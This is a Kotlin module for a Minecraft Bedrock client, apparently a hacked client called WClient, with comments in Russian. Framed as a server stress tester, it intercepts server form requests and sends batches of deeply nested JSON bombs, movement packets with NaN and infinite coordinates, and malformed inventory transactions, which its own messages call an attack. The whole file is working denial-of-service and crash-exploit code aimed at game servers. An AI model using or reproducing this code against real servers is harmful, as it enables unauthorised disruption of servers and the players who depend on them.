package com.retrivedmods.wclient.game.module.misc

// Импорты для твоего проекта WClient
import com.retrivedmods.wclient.game.GameSession
import com.retrivedmods.wclient.game.InterceptablePacket
import com.retrivedmods.wclient.game.Module
import com.retrivedmods.wclient.game.ModuleCategory
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.cloudburstmc.math.vector.Vector3f
import org.cloudburstmc.protocol.bedrock.data.inventory.InventoryActionData
import org.cloudburstmc.protocol.bedrock.data.inventory.InventorySource
import org.cloudburstmc.protocol.bedrock.data.inventory.ItemData
import org.cloudburstmc.protocol.bedrock.packet.InventoryTransactionPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket
import org.cloudburstmc.protocol.bedrock.packet.MovePlayerPacket

/**
 * Универсальный модуль для стресс-тестирования уязвимостей сервера,
 * отправляющий пачки аномальных пакетов.
 */
class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Misc) {

    // --- Настройки ---
    private val testWithJsonBomb by boolValue("Test JSON Bomb", true)
    private val testWithInvalidMove by boolValue("Test Invalid Movement", true)
    private val testWithInvalidInventory by boolValue("Test Invalid Inventory", true)

    // <<< НОВОЕ: Настройки для контроля спама
    private val spamAmount by intValue("Spam Amount", 10, 1..100)
    private val spamDelay by intValue("Spam Delay (ms)", 20, 0..200)

    private val attackDelay by intValue("Attack Delay (ms)", 200, 50..1000)
    private val jsonNestingDepth by intValue("JSON Nesting Depth", 5000, 100..5000)

    override fun onEnabled() {
        super.onEnabled()
        if (isSessionCreated) session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
    }

    override fun onDisabled() {
        super.onDisabled()
        if (isSessionCreated) session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
    }

    override fun beforePacketBound(interceptablePacket: InterceptablePacket) {
        if (!isEnabled) return

        val packet = interceptablePacket.packet
        if (packet is ModalFormRequestPacket) {
            interceptablePacket.intercept()
            session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Начинаю спам-атаку...")

            GlobalScope.launch {
                if (testWithJsonBomb) {
                    session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount JSON-бомб...")
                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
                    repeat(spamAmount) {
                        sendJsonBomb(packet.formId)
                        delay(spamDelay.toLong())
                    }
                }

                delay(attackDelay.toLong()) // Задержка между разными типами атак

                if (testWithInvalidMove) {
                    session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount пакетов движения...")
                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
                    repeat(spamAmount) {
                        sendInvalidMovePacket()
                        delay(spamDelay.toLong())
                    }
                }

                delay(attackDelay.toLong())

                if (testWithInvalidInventory) {
                    session.displayClientMessage("§e[AnomalousTester] Отправка $spamAmount транзакций инвентаря...")
                    // <<< ИЗМЕНЕНО: Отправляем пачку пакетов
                    repeat(spamAmount) {
                        sendInvalidInventoryPacket()
                        delay(spamDelay.toLong())
                    }
                }
                session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте консоль сервера.")
            }
        }
    }

    // Функции отправки пакетов остаются без изменений, мы просто вызываем их в цикле
    private fun sendJsonBomb(formId: Int) {
        try {
            val responsePacket = ModalFormResponsePacket()
            responsePacket.setFormId(formId)
            var maliciousJson = "\"leaf\""
            for (i in 1..jsonNestingDepth) {
                maliciousJson = "{\"key\":$maliciousJson}"
            }
            responsePacket.setFormData(maliciousJson)
            session.serverBound(responsePacket)
        } catch (e: Exception) {
            // Сообщения об ошибках лучше не спамить в чат, одного раза достаточно
        }
    }

    private fun sendInvalidMovePacket() {
        try {
            val movePacket = MovePlayerPacket()
            movePacket.runtimeEntityId = session.localPlayer.runtimeId
            movePacket.position = Vector3f.from(Double.NaN, 128.0, Double.POSITIVE_INFINITY)
            movePacket.rotation = session.localPlayer.rotation
            movePacket.mode = MovePlayerPacket.Mode.NORMAL
            session.serverBound(movePacket)
        } catch (e: Exception) {
        }
    }

    private fun sendInvalidInventoryPacket() {
        try {
            val transactionPacket = InventoryTransactionPacket()
            val invalidAction = InventoryActionData(
                InventorySource.fromContainerWindowId(0), -1, ItemData.AIR, ItemData.AIR
            )
            transactionPacket.transactionType = InventoryTransactionPacket.Type.NORMAL
            transactionPacket.actions.add(invalidAction)
            session.serverBound(transactionPacket)
        } catch (e: Exception) {
        }
    }
}
